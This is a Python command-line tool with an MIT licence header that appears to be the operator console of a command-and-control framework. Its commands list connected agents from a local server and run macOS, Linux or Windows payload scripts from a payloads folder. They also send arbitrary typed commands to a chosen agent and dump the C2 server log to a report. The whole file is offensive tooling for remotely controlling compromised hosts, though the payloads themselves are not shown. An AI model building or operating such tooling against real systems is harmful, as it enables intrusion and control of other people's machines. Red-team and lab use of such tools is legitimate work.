######################################################################################################################################################################################################################
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
######################################################################################################################################################################################################################


import typer
import os
import subprocess
import requests  # Ensure this import statement is present

cli = typer.Typer()

@cli.command("list-agents")
def list_agents_cli():
    response = requests.get("http://127.0.0.1:8000/list_agents")
    agents = response.json().get("agents", [])
    for agent in agents:
        typer.echo(f"Agent ID: {agent['AgentID']}")

@cli.command("deploy-payload")
def deploy_payload(agent_type: str):
    project_root = os.path.dirname(os.path.abspath(__file__))
    payload_dir = os.path.join(project_root, "../payloads")
    
    if agent_type == "macos":
        # Execute macOS payload
        subprocess.run([os.path.join(payload_dir, "macos_payload.sh")])
    elif agent_type == "linux":
        # Execute Linux payload
        subprocess.run([os.path.join(payload_dir, "linux_payload.sh")])
    elif agent_type == "windows":
        # Execute Windows payload
        subprocess.run(["powershell.exe", os.path.join(payload_dir, "windows_payload.ps1")])
    else:
        typer.echo("Unknown agent type. Please specify 'macos', 'linux', or 'windows'.")

@cli.command("select-agent")
def select_agent(agent: str = typer.Argument(None, help="The ID of the agent")):
    if agent is None:
        response = requests.get("http://127.0.0.1:8000/list_agents")
        agents = response.json().get("agents", [])
        agent_ids = [agent['AgentID'] for agent in agents]
        if not agent_ids:
            typer.echo("No agents available.")
            return

        agent_id = typer.prompt("Select an agent", type=typer.Choice(agent_ids))
    else:
        agent_id = agent

    while True:
        command = typer.prompt(f"Enter command to send to agent {agent_id} (or 'exit' to stop)")
        if command.lower() == "exit":
            break
        response = requests.post("http://127.0.0.1:8000/sendcommand", json={"AgentID": agent_id, "Command": command})
        typer.echo(f"Command '{command}' sent to agent {agent_id}")

@cli.command("generate-report")
def generate_report():
    with open('c2_server.log', 'r') as log_file, open('report.txt', 'w') as report_file:
        report_file.write(log_file.read())
    typer.echo("Report generated as report.txt")

if __name__ == "__main__":
    cli()

